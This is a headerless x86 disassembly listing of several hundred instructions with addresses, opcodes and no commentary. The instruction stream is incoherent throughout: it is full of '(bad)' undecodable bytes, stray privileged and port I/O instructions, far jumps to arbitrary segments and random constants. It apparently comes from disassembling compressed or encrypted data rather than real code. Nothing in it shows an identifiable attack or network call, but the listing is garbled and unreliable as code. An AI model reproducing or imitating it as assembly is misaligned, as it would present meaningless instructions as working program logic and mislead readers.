  416fab:	sar    edx,1
  416fad:	and    BYTE PTR [esi+0x3c],al
  416fb0:	xchg   ebp,eax
  416fb1:	test   esi,eax
  416fb3:	lea    esi,[edx-0x3571e7c8]
  416fb9:	stos   BYTE PTR es:[edi],al
  416fba:	daa    
  416fbb:	stos   DWORD PTR es:[edi],eax
  416fbc:	test   DWORD PTR [eax],0x9fadb300
  416fc2:	mov    DWORD PTR [ebx+0x4a],esp
  416fc5:	into   
  416fc6:	sbb    ebx,DWORD PTR [eax]
  416fc8:	push   ebx
  416fc9:	and    eax,0xda9bbe6e
  416fce:	mov    esp,0xe46da3c2
  416fd3:	das    
  416fd4:	pmullw mm5,mm7
  416fd7:	cli    
  416fd8:	mov    eax,ds:0x6ae5adf8
  416fdd:	sahf   
  416fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fdf:	push   esp
  416fe0:	or     eax,0xa40d42d6
  416fe5:	xor    BYTE PTR [edx+0x32],bl
  416fe8:	and    DWORD PTR [ebp+edx*1+0x51177c9c],edi
  416fef:	cdq    
  416ff0:	and    eax,0xf294487c
  416ff5:	scas   al,BYTE PTR es:[edi]
  416ff6:	pop    ds
  416ff7:	push   0x9831f41b
  416ffc:	(bad)  
  416ffd:	sahf   
  416ffe:	mov    edi,0xc4d954c1
  417003:	les    edx,FWORD PTR fs:[edx]
  417006:	pusha  
  417007:	ja     0x416ffe
  417009:	push   ds
  41700a:	out    dx,eax
  41700b:	dec    ebx
  41700c:	cmp    DWORD PTR [edx+0x6cbf05],0xffffffa4
  417013:	(bad)  
  417015:	scas   eax,DWORD PTR es:[edi]
  417016:	or     eax,0xe3fb3032
  41701b:	test   BYTE PTR [edx],ch
  41701d:	push   esp
  41701e:	adc    ebp,DWORD PTR [ebx]
  417020:	pop    ss
  417021:	cmp    DWORD PTR [eax],esi
  417023:	sub    al,0x7e
  417025:	xor    DWORD PTR [esi],ebp
  417027:	jae    0x416fc6
  417029:	retf   0x8b97
  41702c:	jmp    0x417015
  41702e:	inc    ebx
  41702f:	sbb    al,0x4
  417031:	ds add eax,0xf001350a
  417037:	push   ebp
  417038:	data16 adc al,BYTE PTR es:[ecx+0x197be8e3]
  417040:	mov    al,0x88
  417042:	es clc 
  417044:	stc    
  417045:	shl    BYTE PTR [ecx+0x32],cl
  417048:	dec    eax
  417049:	sbb    al,0x96
  41704c:	scas   al,BYTE PTR es:[edi]
  41704d:	repz mov edx,DWORD PTR [ecx+ebp*2-0x79b88d]
  417055:	or     eax,esp
  417057:	inc    eax
  417058:	lahf   
  417059:	xor    DWORD PTR [ebx-0x4dfd99d8],eax
  41705f:	arpl   WORD PTR [ebx-0x5d4c6e10],cx
  417065:	pop    ebx
  417066:	cmp    BYTE PTR [ebp+0x3659c45a],0x73
  41706d:	std    
  41706e:	loopne 0x417080
  417070:	(bad)  
  417071:	aas    
  417072:	out    0x33,al
  417074:	cdq    
  417075:	inc    edx
  417076:	pusha  
  417077:	push   ebp
  417078:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417079:	jmp    0x18b13000
  41707e:	pop    ds
  41707f:	test   BYTE PTR [ebx-0x2c],bl
  417082:	popa   
  417083:	push   ds
  417084:	cdq    
  417085:	and    eax,0x80fc69de
  41708a:	outs   dx,BYTE PTR ds:[esi]
  41708b:	mov    esi,0x2ca8cf3d
  417090:	test   al,0x66
  417092:	xchg   edi,eax
  417093:	push   es
  417094:	mov    ch,0xfc
  417096:	dec    eax
  417097:	xor    BYTE PTR ds:0xe594a242,ah
  41709d:	sti    
  41709e:	mov    ebx,DWORD PTR [eax-0x4fad227c]
  4170a4:	or     ebx,DWORD PTR [esi-0x5196698c]
  4170aa:	je     0x41710e
  4170ac:	stc    
  4170ad:	mov    ch,0x78
  4170af:	imul   edi,DWORD PTR [edx-0x4645b210],0x92a45afe
  4170b9:	stos   DWORD PTR es:[edi],eax
  4170ba:	icebp  
  4170bb:	ror    BYTE PTR [esi+eiz*4-0x57],cl
  4170bf:	mov    cl,0xdf
  4170c1:	scas   al,BYTE PTR es:[edi]
  4170c2:	push   esi
  4170c3:	leave  
  4170c4:	cmp    BYTE PTR [ebx],0x65
  4170c7:	dec    esp
  4170c8:	pop    ss
  4170c9:	jl     0x417124
  4170cb:	and    DWORD PTR [eax+edx*8+0x48f41fc3],eax
  4170d2:	push   ebx
  4170d3:	and    ecx,ebp
  4170d5:	xor    esp,DWORD PTR [ebx]
  4170d7:	sub    al,0xaf
  4170d9:	in     al,0xf4
  4170db:	pop    ebx
  4170dc:	fst    st(3)
  4170de:	popa   
  4170df:	pop    edi
  4170e0:	jbe    0x417128
  4170e2:	xchg   edx,eax
  4170e3:	pop    eax
  4170e4:	jmp    0xf964:0x63536e35
  4170eb:	and    al,0x2a
  4170ed:	sti    
  4170ee:	pop    edx
  4170ef:	mov    ah,0x61
  4170f1:	xchg   ch,ah
  4170f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170f4:	or     DWORD PTR [esi+0x4c487a02],edi
  4170fa:	pop    esp
  4170fb:	sub    eax,0x82da727
  417100:	popa   
  417101:	mov    dh,BYTE PTR [esi+0x60a19d32]
  417107:	repnz cwde 
  417109:	dec    dx
  41710b:	mov    ecx,0x907b6914
  417110:	mov    bl,0x8
  417112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417113:	push   edi
  417114:	sbb    BYTE PTR [esi+0x12],bl
  417117:	jmp    0x73a:0x88561040
  41711e:	or     al,BYTE PTR [ebx]
  417120:	mov    cl,0xee
  417122:	or     bh,cl
  417124:	inc    ebx
  417125:	jno    0x417193
  417127:	push   0xffffffec
  417129:	inc    ebx
  41712a:	sbb    eax,0xb61a5e1f
  41712f:	push   esi
  417130:	fmul   DWORD PTR [eax-0x63]
  417133:	cmp    ah,BYTE PTR [ebx+ebx*4+0x7b17ab6c]
  41713a:	mov    ebx,0xee2714c
  41713f:	addr16 push di
  417142:	sti    
  417143:	test   dl,0x16
  417146:	sbb    al,0x75
  417148:	mov    dl,0x40
  41714a:	sbb    BYTE PTR [edi-0x36b14e22],0xc8
  417151:	sar    dl,cl
  417153:	xor    eax,0xbbf74ad5
  417158:	jne    0x41713d
  41715a:	mov    al,ds:0xa94afc57
  41715f:	sbb    esi,DWORD PTR [ecx]
  417161:	inc    esp
  417162:	and    ebx,DWORD PTR [eax]
  417164:	mov    ds:0x61c778ea,eax
  417169:	inc    edx
  41716a:	mov    cl,0xc0
  41716c:	mov    al,0xf4
  41716e:	aam    0x74
  417170:	or     DWORD PTR [esi+ebx*4+0x542b2d61],edx
  417177:	pop    ebx
  417178:	or     eax,ebp
  41717a:	cld    
  41717b:	out    0xe1,al
  41717d:	sub    al,0x25
  41717f:	ret    
  417180:	ds xchg ebp,eax
  417182:	add    bh,dh
  417184:	xchg   DWORD PTR [edx],ebp
  417186:	outs   dx,DWORD PTR cs:[esi]
  417188:	adc    ecx,ebx
  41718a:	dec    ebx
  41718b:	arpl   WORD PTR ds:0x49beef76,sp
  417191:	and    al,0x8
  417193:	sbb    dh,BYTE PTR [edx+0x37e170d8]
  417199:	sbb    al,0x8d
  41719b:	push   esi
  41719c:	repz (bad) 
  41719e:	sub    DWORD PTR [esi*4+0x59f9f904],esp
  4171a5:	pop    ebp
  4171a6:	adc    DWORD PTR [edi],ebp
  4171a8:	and    DWORD PTR [ebx+0x26],esp
  4171ab:	shl    DWORD PTR [ecx-0x38],0x73
  4171af:	out    dx,al
  4171b0:	mov    ebp,0xadf0b9b1
  4171b5:	jg     0x417161
  4171b7:	add    al,0x10
  4171b9:	dec    eax
  4171ba:	pop    edx
  4171bb:	icebp  
  4171bc:	popf   
  4171bd:	sub    al,0x96
  4171bf:	cld    
  4171c0:	dec    ebx
  4171c1:	xor    esp,DWORD PTR [ebx+0x7e3d9519]
  4171c7:	dec    ecx
  4171c8:	idiv   DWORD PTR [ecx-0x12]
  4171cb:	add    al,0x10
  4171cd:	jge    0x417208
  4171cf:	or     edx,esi
  4171d1:	imul   ebp,DWORD PTR [esi+0x58],0x18a14ea0
  4171d8:	aaa    
  4171d9:	fucomi st,st(2)
  4171db:	ror    BYTE PTR [edx],cl
  4171dd:	push   eax
  4171de:	xor    al,0x81
  4171e1:	addr16 imul esp,ebx,0xffffffd7
  4171e5:	mov    dl,0xcc
  4171e7:	dec    esi
  4171e8:	fidiv  DWORD PTR [ebx]
  4171ea:	dec    ecx
  4171eb:	out    0xc0,al
  4171ed:	ret    
  4171ee:	cmp    dh,ch
  4171f0:	jb     0x41724a
  4171f2:	mov    ecx,0xd8b3b2d0
  4171f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171f8:	call   0xb03d026
  4171fd:	sbb    edx,ecx
  4171ff:	mov    ?,WORD PTR [ecx-0x2bc5f877]
  417205:	(bad)  
  417206:	sbb    esi,DWORD PTR [ebp-0x64c974a4]
  41720c:	das    
  41720d:	jp     0x4171b1
  41720f:	iret   
  417210:	ret    0xfad2
  417213:	std    
  417214:	jmp    0xf3c8:0x7a54b221
  41721b:	push   esp
  41721c:	mov    DWORD PTR [esi+0x5c6de95c],0xc7f901c6
  417226:	inc    ebx
  417227:	jnp    0x417298
  417229:	cmp    DWORD PTR [ecx-0x55],esi
  41722c:	fs out 0xac,eax
  41722f:	jg     0x417220
  417231:	daa    
  417232:	push   esp
  417233:	dec    ecx
  417234:	lahf   
  417235:	adc    BYTE PTR [ebx+0x37],ah
  417238:	shl    BYTE PTR es:[ebp-0x61],0xb
  41723d:	enter  0x3328,0xee
  417241:	nop
  417242:	inc    esp
  417243:	or     al,bh
  417245:	push   esi
  417246:	push   cs
  417247:	inc    edx
  417248:	ins    BYTE PTR es:[edi],dx
  417249:	(bad)  
  41724a:	push   DWORD PTR [edx]
  41724c:	sbb    al,0x89
  41724e:	sbb    eax,0xf27dea3
  417253:	jle    0x417251
  417255:	jecxz  0x417212
  417257:	(bad)  
  417258:	xor    al,0xf0
  41725a:	sub    al,0x43
  41725c:	aaa    
  41725d:	pop    es
  41725e:	push   ds
  41725f:	jno    0x417264
  417261:	lds    ecx,FWORD PTR [ebp+eax*8-0x32c9fb57]
  417268:	aam    0xd6
  41726a:	cmp    BYTE PTR [ecx+eax*4-0x1a],ch
  41726e:	stc    
  41726f:	out    0x19,al
  417271:	js     0x417291
  417273:	dec    BYTE PTR [esi+edi*4+0x45355dc3]
  41727a:	cwde   
  41727b:	mov    ebp,0x441ffe74
  417280:	retf   
  417281:	in     eax,dx
  417282:	(bad)  
  417283:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417284:	jno    0x4172a9
  417286:	enter  0x4e09,0x5e
  41728a:	jb     0x417230
  41728c:	xchg   esp,eax
  41728d:	mov    ch,0x43
  41728f:	push   0x6e0b0ff
  417294:	int    0xfb
  417296:	ins    BYTE PTR es:[edi],dx
  417297:	(bad)  
  417298:	rcr    BYTE PTR [eax],0xe3
  41729b:	inc    edx
  41729c:	xor    al,BYTE PTR [ecx]
  41729e:	xchg   dh,dh
  4172a0:	xchg   edi,eax
  4172a1:	add    BYTE PTR [ebp-0x53],bl
  4172a4:	mov    ebx,0xb0b5f3f8
  4172a9:	mov    ds:0x3536f700,al
  4172ae:	clc    
  4172af:	ins    DWORD PTR es:[edi],dx
  4172b0:	cmpxchg BYTE PTR [edx+0x44ff9f45],dl
  4172b7:	xor    BYTE PTR [ebp-0x16fc9064],bh
  4172bd:	add    ah,ah
  4172bf:	push   ss
  4172c0:	dec    eax
  4172c1:	mov    al,0x88
  4172c3:	jmp    0xb61d:0x78581e0f
  4172ca:	clc    
  4172cb:	adc    ebp,esp
  4172cd:	int    0x3a
  4172cf:	gs xchg ecx,ecx
  4172d2:	fstp   TBYTE PTR [edx+0x3740de22]
  4172d8:	xor    eax,0x881983c9
  4172dd:	sub    eax,0x14f69072
  4172e2:	inc    esp
  4172e3:	test   ax,0xf2f7
  4172e7:	pushf  
  4172e8:	inc    eax
  4172e9:	xchg   edx,eax
  4172ea:	enter  0x54e3,0x3d
  4172ee:	not    DWORD PTR [edx-0x3a451126]
  4172f4:	inc    ebp
  4172f5:	into   
  4172f6:	sahf   
  4172f7:	add    DWORD PTR [ebp-0x55],0xffffff9a
  4172fb:	(bad)  
  4172fd:	jne    0x4172d0
  4172ff:	dec    eax
  417300:	hlt    
  417301:	jbe    0x4172f9
  417303:	inc    ah
  417305:	popa   
  417306:	aaa    
  417307:	mov    ch,0x49
  417309:	inc    esp
  41730a:	es bnd jns 0x41735b
  41730e:	shr    BYTE PTR [ebp+0x6c],cl
  417311:	sub    eax,0x6c08cf18
  417316:	jp     0x417321
  417318:	clc    
  417319:	loopne 0x417389
  41731b:	mov    esp,0xd468d317
  417320:	sbb    eax,0x8288f64a
  417325:	pop    ds
  417326:	dec    edx
  417327:	shl    BYTE PTR [ecx+0x48],cl
  41732a:	out    0x5,eax
  41732c:	dec    eax
  41732d:	in     eax,0xaf
  41732f:	jno    0x41735b
  417331:	sub    BYTE PTR [ebp-0xa],dl
  417334:	test   eax,0xb83738e8
  417339:	sbb    bh,cl
  41733b:	arpl   WORD PTR [eax],bx
  41733d:	js     0x4173af
  41733f:	sahf   
  417340:	jg     0x417315
  417342:	shl    DWORD PTR [bx+di],cl
  417345:	and    edx,DWORD PTR [ebx]
  417347:	iret   
  417348:	loop   0x417388
  41734a:	out    0x70,eax
  41734c:	mov    ecx,0x2a36dc62
  417351:	sbb    esi,DWORD PTR [ebx-0x3eabe9e9]
  417357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417358:	jns    0x417345
  41735a:	cld    
  41735b:	sbb    DWORD PTR [edx-0x6ea9933a],0x34a2d83d
  417365:	dec    esp
  417366:	adc    BYTE PTR ds:[esi],ah
  417369:	sbb    al,0xa0
  41736b:	(bad)  
  41736c:	clc    
  41736d:	jmp    0x72926f78
  417372:	out    dx,eax
  417373:	call   0x8aa3:0xf59663e0
  41737a:	into   
  41737b:	sbb    BYTE PTR [eax-0x3c],ch
  41737e:	bound  esp,QWORD PTR [edx]
  417380:	sub    ah,BYTE PTR [edi]
  417382:	pushf  
  417383:	cmp    al,BYTE PTR [esi]
  417385:	fsubr  QWORD PTR [ebx+0x43]
  417389:	cmp    edi,ebx
  41738b:	mov    ebp,0xfe55b4c8
  417390:	or     eax,0x6ed920fc
  417395:	daa    
  417396:	pop    eax
  417397:	or     eax,0x75599645
  41739c:	add    bh,BYTE PTR [eax-0x7a649126]
  4173a2:	xor    al,0xff
  4173a4:	mov    ds:0x143a0616,al
  4173a9:	stos   BYTE PTR es:[edi],al
  4173aa:	dec    ebx
  4173ab:	imul   esp,DWORD PTR [ecx-0x61941454],0xffffff87
  4173b2:	ins    BYTE PTR es:[edi],dx
  4173b3:	mov    ah,bh
  4173b5:	pop    edi
  4173b6:	fistp  DWORD PTR [edx]
  4173b8:	adc    DWORD PTR [ecx+0x53eea20d],0x87028a3a
  4173c2:	inc    ebp
  4173c3:	jne    0x41737b
  4173c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173c6:	packssdw mm4,mm5
  4173c9:	adc    eax,0x61c528c8
  4173ce:	in     al,dx
  4173cf:	add    al,0xbd
  4173d1:	ins    DWORD PTR es:[edi],dx
  4173d2:	frstor [edx+0x2be9a196]
  4173d8:	add    BYTE PTR [eax*8+0x7a18b0a7],ah
  4173df:	arpl   WORD PTR [ecx-0x47b0b70c],sp
  4173e5:	mov    ch,0x74
  4173e7:	out    0x60,eax
  4173e9:	add    DWORD PTR [ebx],ebp
  4173eb:	pop    edx
  4173ec:	rcl    DWORD PTR [ebx+0x55],0x7e
  4173f0:	hlt    
  4173f1:	outs   dx,DWORD PTR ds:[esi]
  4173f2:	mov    bl,0xfb
  4173f5:	mov    ebx,esi
  4173f7:	popa   
  4173f8:	and    ecx,DWORD PTR [esi]
  4173fa:	xor    BYTE PTR [ebp-0x3b],cl
  4173fd:	xchg   ecx,eax
  4173fe:	jp     0x4173d4
  417400:	mov    bl,BYTE PTR [edi-0x57c17e78]
  417406:	jp     0x417430
  417408:	add    al,0x62
  41740a:	mov    eax,ds:0x8bfba160
  41740f:	ins    DWORD PTR es:[edi],dx
  417410:	sbb    BYTE PTR [edi+edx*8],ah
  417413:	cmp    al,0xb4
  417415:	push   edx
  417416:	sbb    dl,BYTE PTR [ecx-0x1cef9d1]
  41741c:	mov    edx,0xd8063c10
  417421:	mov    eax,ds:0xb3c1a248
  417426:	mov    eax,0xaebc43f8
  41742b:	test   BYTE PTR [edx+0x22],cl
  41742e:	and    eax,0x10bf5388
  417433:	xor    eax,0x171708c
  417438:	mov    ebp,0x4e2d324e
  41743d:	or     eax,0x5ca799c8
  417442:	pop    ss
  417443:	xor    al,0x1
  417445:	jmp    0x53c4:0x13531399
  41744c:	neg    DWORD PTR [ebp+0x69]
  41744f:	scas   al,BYTE PTR es:[edi]
  417450:	imul   bl
  417452:	fldcw  WORD PTR [edi+0x65]
  417455:	jg     0x4173e7
  417457:	mov    ebp,cs
  417459:	out    0xe3,al
  41745b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41745c:	mov    dl,0x7b
  41745e:	or     esp,DWORD PTR [edi-0x7c5111d4]
  417464:	xchg   esi,eax
  417465:	pop    ebx
  417466:	int3   
  417467:	add    ah,bh
  417469:	mov    ch,0x1a
  41746b:	out    dx,eax
  41746c:	mov    ebp,0xb1f0f403
  417471:	pop    esi
  417472:	sbb    al,0x91
  417474:	push   ecx
  417475:	adc    esi,ebp
  417477:	or     al,0x3d
  417479:	pop    ebx
  41747a:	jb     0x4174ea
  41747c:	or     BYTE PTR [ebx],dh
  41747e:	mov    ds:0xf69d13ac,al
  417483:	sbb    DWORD PTR [esi+0x4f],ecx
  417486:	mov    eax,ds:0x7e51b6ef
  41748b:	loopne 0x4174ce
  41748d:	mov    ds:0x111500d9,al
  417492:	(bad)  
  417493:	outs   dx,DWORD PTR ds:[esi]
  417494:	mov    esp,0x518527
  417499:	iret   
  41749a:	stos   DWORD PTR es:[edi],eax
  41749b:	inc    ebp
  41749c:	push   eax
  41749d:	mov    edi,0x1994752d
  4174a2:	into   
  4174a3:	aaa    
  4174a4:	and    al,0x6d
  4174a6:	mov    BYTE PTR [ecx+0x60],dl
  4174a9:	cmp    al,0x54
  4174ab:	xchg   esi,eax
  4174ac:	pop    ebp
  4174ad:	xchg   esi,eax
  4174ae:	int    0x76
  4174b0:	nop
  4174b1:	push   esi
  4174b2:	mov    DWORD PTR [edx+ecx*1],edi
  4174b5:	cld    
  4174b6:	call   FWORD PTR ds:0xce520c2c
  4174bc:	and    cl,BYTE PTR [ebx-0xee856f9]
  4174c2:	test   edx,esi
  4174c4:	push   edx
  4174c5:	sbb    al,BYTE PTR [ecx+0x6e]
  4174c8:	and    al,0x70
  4174ca:	(bad)  
  4174cc:	ret    
  4174cd:	stc    
  4174ce:	inc    edi
  4174cf:	outs   dx,BYTE PTR ds:[esi]
  4174d0:	dec    edi
  4174d1:	outs   dx,DWORD PTR ds:[esi]
  4174d2:	push   esi
  4174d3:	(bad)  
  4174d4:	mov    edi,0x4b84bad8
  4174d9:	and    DWORD PTR [eax],esi
  4174db:	sbb    eax,0xe428a214
  4174e0:	jmp    0x417487
  4174e2:	pushf  
  4174e3:	xchg   edx,eax
  4174e4:	push   edx
  4174e5:	nop
  4174e6:	sbb    al,0xd5
  4174e8:	repz push es
  4174ea:	clc    
  4174eb:	pop    ebp
  4174ec:	es call 0x1d602ed3
  4174f2:	int    0x18
  4174f4:	pop    ebp
  4174f5:	jb     0x4174e6
  4174f7:	mov    eax,0x7548e8c2
  4174fc:	sbb    al,0x3f
  4174fe:	jbe    0x41750d
  417500:	call   0xdf78:0xb2cdc1d0
  417507:	fistp  QWORD PTR [ecx+edx*1+0x6f2c04d7]
  41750e:	jecxz  0x417505
  417510:	cdq    
  417511:	sub    BYTE PTR [ecx],bl
  417513:	in     eax,dx
  417514:	add    al,dl
  417516:	fisubr WORD PTR [eax-0xb]
  417519:	dec    edx
  41751a:	repz in al,0x1c
  41751d:	fisubr WORD PTR [eax]
  41751f:	inc    edx
  417520:	mov    edi,0xd5628605
  417525:	leave  
  417526:	adc    bl,dl
  417528:	add    BYTE PTR [edx+edx*8],dh
  41752b:	and    edi,DWORD PTR [edx+0x57eb43bc]
  417531:	xor    BYTE PTR [di-0x18],cl
  417535:	popw   ds
  417537:	jbe    0x417505
  417539:	mov    ebp,DWORD PTR [ebx]
  41753b:	aam    0x84
  41753d:	pusha  
  41753e:	rol    BYTE PTR [ebp-0x3eed0c36],0x83
  417545:	int3   
  417546:	and    BYTE PTR [ebp-0xf],ch
  417549:	aas    
  41754a:	les    edi,FWORD PTR [ecx+0x72806d2a]
  417550:	test   al,0xc1
  417552:	pop    esi
  417553:	out    0x4,al
  417555:	pop    esp
  417556:	ja     0x417515
  417558:	mov    WORD PTR [ecx],ds
  41755a:	sbb    BYTE PTR [edi-0x77eafdf8],ch
  417560:	pop    esp
  417561:	in     al,0xcd
  417563:	loopne 0x4175ba
  417565:	inc    edx
  417566:	push   edi
  417567:	inc    edi
  417568:	(bad)  
  417569:	stc    
  41756a:	fiadd  WORD PTR [edi+eax*4-0x79]
  41756e:	add    ecx,DWORD PTR [ecx+0x643edcb9]
  417574:	aas    
  417575:	popf   
  417576:	xor    ebx,DWORD PTR [ebx+0x124b8558]
  41757c:	sbb    eax,edi
  41757e:	stc    
  41757f:	sbb    edx,ebx
  417581:	std    
  417582:	adc    esp,DWORD PTR [ecx]
  417584:	mov    dl,0x8a
  417586:	jp     0x417532
  417588:	push   esp
  417589:	add    esp,DWORD PTR [edx]
  41758b:	ss jnp 0x4175c1
  41758e:	ret    0x71ba
  417591:	ror    DWORD PTR [ebx],1
  417593:	gs cmc 
  417595:	aad    0xdc
  417597:	fldcw  WORD PTR [esi+0x4a]
  41759a:	fadd   QWORD PTR [edx]
  41759c:	sar    BYTE PTR [edx],cl
  41759e:	push   eax
  41759f:	popa   
  4175a0:	xchg   BYTE PTR [ecx],bh
  4175a2:	pop    esp
  4175a3:	mov    dh,0x1c
  4175a5:	mov    ecx,DWORD PTR [edi]
  4175a7:	add    DWORD PTR [eax+0x1f],0x8934da41
  4175ae:	push   ecx
  4175af:	aaa    
  4175b0:	mov    esi,0x92ebd39f
  4175b5:	in     al,0x5a
  4175b7:	into   
  4175b8:	cld    
  4175b9:	xor    bh,BYTE PTR [edi]
  4175bb:	xlat   BYTE PTR ds:[ebx]
  4175bc:	mov    eax,ds:0xd10baa01
  4175c1:	pop    edi
  4175c2:	test   dh,0xa5
  4175c5:	xor    ch,dh
  4175c7:	int    0x70
  4175c9:	repnz retf 
  4175cb:	adc    eax,0xeffec7ea
  4175d0:	arpl   WORD PTR [esi-0x15],ax
  4175d3:	or     ecx,DWORD PTR [esi-0x2a126106]
  4175d9:	push   0xffffff8b
  4175db:	xor    edi,DWORD PTR [eax]
  4175dd:	sti    
  4175de:	push   ecx
  4175df:	out    0xf7,al
  4175e1:	mov    ch,0xf9
  4175e3:	(bad)  
  4175e5:	add    DWORD PTR [ebx],edi
  4175e7:	out    0x6a,eax
  4175e9:	aas    
  4175ea:	mov    BYTE PTR [ecx+0x26],ch
  4175ed:	sub    DWORD PTR [ecx-0x63517fba],edx
  4175f3:	dec    edx
  4175f4:	pop    ebp
  4175f5:	push   ebp
  4175f6:	inc    eax
  4175f7:	add    DWORD PTR [edx+0x4f729acb],esp
  4175fd:	test   al,0x7a
  4175ff:	mov    ebp,0xfb26201b
  417604:	xchg   edx,eax
  417605:	xchg   esi,eax
  417606:	sub    ch,BYTE PTR [edx]
  417608:	push   ss
  417609:	inc    ecx
  41760a:	jp     0x417680
  41760c:	pop    si
  41760e:	aam    0xbc
  417610:	es loope 0x41764d
  417613:	jo     0x417622
  417615:	das    
  417616:	xor    DWORD PTR [ebx-0x71],ecx
  417619:	push   eax
  41761a:	inc    esi
  41761b:	out    0xf9,eax
  41761d:	lods   eax,DWORD PTR ds:[esi]
  41761e:	or     al,0x6c
  417620:	push   ecx
  417621:	fs dec eax
  417623:	mov    ds:0xaac9a285,al
  417628:	adc    BYTE PTR [eax],0x47
  41762b:	inc    eax
  41762c:	cmp    BYTE PTR [ebx*4+0x37239a6b],dh
  417633:	fs jmp 0x3174afcd
  417639:	out    0xb,eax
  41763b:	retf   0x3ce3
  41763e:	data16 stc 
  417640:	xchg   esi,eax
  417641:	in     al,0xee
  417643:	xchg   ebp,eax
  417644:	ins    DWORD PTR es:[edi],dx
  417645:	push   ebp
  417646:	push   esi
  417647:	sub    al,0x21
  41764a:	out    dx,eax
  41764b:	ins    BYTE PTR es:[edi],dx
  41764c:	clc    
  41764d:	xor    dl,BYTE PTR [ebp+0x4c]
  417650:	pop    eax
  417651:	pop    eax
  417652:	jg     0x4175f9
  417654:	pop    ss
  417655:	data16 ja 0x417652
  417658:	mov    ds:0x7fad362d,al
  41765d:	adc    DWORD PTR [ebp-0x75],esp
  417660:	sub    esp,DWORD PTR [esi+0x31]
  417663:	repz pop esp
  417665:	es inc eax
  417667:	and    DWORD PTR [eax-0x33],esi
  41766a:	shl    eax,0x61
  41766d:	fnstcw WORD PTR [ebp-0x6009511]
  417673:	push   esp
  417674:	mov    eax,0x26bfb955
  417679:	mov    es,WORD PTR [eax+0x3508a2ee]
  41767f:	rol    BYTE PTR [esi],1
  417681:	xor    dh,bl
  417683:	and    DWORD PTR [ebx-0x750ab76d],edx
  417689:	jmp    0x417625
  41768b:	fisubr DWORD PTR [ebx-0x37dc7ac3]
  417691:	scas   al,BYTE PTR es:[edi]
  417692:	sub    bh,BYTE PTR [ebx-0x3a4e8ee6]
  417698:	out    0xba,al
  41769a:	jnp    0x417640
  41769c:	mov    bh,ch
  41769e:	dec    edi
  41769f:	cmp    eax,0x971521aa
  4176a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176a5:	mov    ecx,0x73ce502a
  4176aa:	popf   
  4176ab:	mov    esi,0x55ab3379
  4176b0:	mov    edx,0x42f05a7e
  4176b5:	cmp    dh,0x44
  4176b8:	icebp  
  4176b9:	out    dx,eax
  4176ba:	add    al,0x15
  4176bc:	cmp    DWORD PTR [esi],edx
  4176be:	jno    0x4176e9
  4176c0:	(bad)  
  4176c2:	mov    esp,0xaa9ed7ed
  4176c7:	cmp    BYTE PTR [edi-0x39107da0],cl
  4176cd:	imul   edi,DWORD PTR [edx-0x13b75c2d],0x10d749d8
  4176d7:	sbb    al,0xcd
  4176d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4176da:	pop    ss
  4176db:	push   cs
  4176dc:	and    al,0x88
  4176de:	fadd   DWORD PTR [eax-0x3db8edc]
  4176e4:	out    0xd8,al
  4176e6:	ja     0x41772c
  4176e8:	push   cs
  4176e9:	sub    eax,0x366509c0
  4176ee:	push   edi
  4176ef:	(bad)  
  4176f1:	jb     0x4176d0
  4176f3:	mov    al,cl
  4176f5:	sbb    dl,BYTE PTR [esi]
  4176f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176f8:	cs aas 
  4176fa:	xor    al,0x41
  4176fc:	(bad)  
  4176fd:	imul   ebx,DWORD PTR [edx-0x71],0xffffff84
  417701:	out    dx,al
  417702:	retf   0x1ce8
  417705:	ins    BYTE PTR es:[edi],dx
  417706:	adc    DWORD PTR [ecx],ebx
  417708:	scas   al,BYTE PTR es:[edi]
  417709:	jae    0x4176d6
  41770b:	or     al,0xf0
  41770d:	nop
  41770e:	cwde   
  41770f:	and    DWORD PTR [edi],0x2b
  417712:	mov    ebx,0x99f1e10d
  417717:	(bad)
  41771b:	lds    edi,FWORD PTR [edx+0x34]
  41771e:	inc    edi
  41771f:	pop    eax
  417720:	sbb    BYTE PTR [ecx],bl
  417722:	jmp    0x9595:0xd366f54c
  417729:	push   esp
  41772a:	arpl   WORD PTR [edi-0x43],cx
  41772d:	inc    ebx
  41772e:	adc    dl,ch
  417730:	dec    edx
  417731:	jmp    0xcc69bc3f
  417736:	mov    ebp,0xde953a5
  41773b:	lock pop ebx
  41773d:	ficom  WORD PTR [edi+0x19c3eb2c]
  417743:	push   ss
  417744:	ret    
  417745:	add    eax,0x9b3e7530
  41774a:	jmp    0x417717
  41774c:	nop
  41774d:	(bad)  
  41774e:	pusha  
  41774f:	and    al,dh
  417751:	ret    0x146d
  417754:	clc    
  417755:	ret    
  417756:	je     0x4177a7
  417758:	mov    esi,0x9ecaf4f7
  41775d:	ret    
  41775e:	int    0x7c
  417760:	ret    
  417761:	rol    DWORD PTR [edx+0x47a9aa5c],1
  417767:	cmp    al,0x2a
  417769:	jno    0x41770b
  41776b:	inc    esi
  41776c:	aad    0xf7
  41776e:	push   ds
  41776f:	mov    esp,0xb8b30df1
  417774:	jae    0x417754
  417776:	push   es
  417777:	cmp    BYTE PTR [esp+edx*4-0x2fc7e663],bl
  41777e:	sub    bl,BYTE PTR [esi]
  417780:	xchg   BYTE PTR [esi],ah
  417782:	or     bl,al
  417784:	shr    BYTE PTR [ecx],cl
  417786:	and    dl,BYTE PTR [ebp-0x7548cde9]
  41778c:	mov    ebp,0xa61a83c
  417791:	mov    bl,0x56
  417793:	idiv   bl
  417795:	ss inc esi
  417797:	mov    ebp,0x8b38929c
  41779c:	aaa    
  41779d:	jno    0x417734
  41779f:	xlat   BYTE PTR ds:[ebx]
  4177a0:	inc    esi
  4177a1:	push   esi
  4177a2:	jnp    0x417788
  4177a4:	mov    edx,0x48ed7ed3
  4177a9:	retf   0x188b
  4177ac:	push   es
  4177ad:	lods   al,BYTE PTR ds:[esi]
  4177ae:	and    ebx,DWORD PTR [edx-0x6d]
  4177b1:	adc    bl,dh
  4177b3:	icebp  
